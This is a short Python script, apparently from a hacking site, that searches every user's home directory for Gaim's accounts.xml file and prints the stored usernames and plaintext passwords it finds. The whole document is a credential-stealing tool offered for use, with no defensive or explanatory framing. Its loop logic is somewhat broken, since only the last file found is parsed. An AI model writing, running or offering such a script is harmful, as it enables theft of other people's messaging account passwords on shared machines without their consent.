#!/usr/bin/python
#Extracts passwords from Gaim accounts.
#d3hydr8[at]gmail[dot]com
#http://darkcode.ath.cx

import sys, os, re 
	
print "\nSearching for gaim accounts...\n"

users = os.listdir("/home")
for line in users:
	try:
		file = os.popen("find /home/"+line+" -name accounts.xml").readlines()
		sets = open(file[0][:-1], "r").readlines()
	except(OSError), msg:
		print msg
for line in sets:
	if re.search("<name>\w+</name>", line):
		print "Username:",line.replace("<name>","").replace('</name>',"")
	if re.search("<password>\w+</password>", line):
		print "Password:",line.replace("<password>","").replace('</password>',"")
		print "-" * 25 ,"\n"


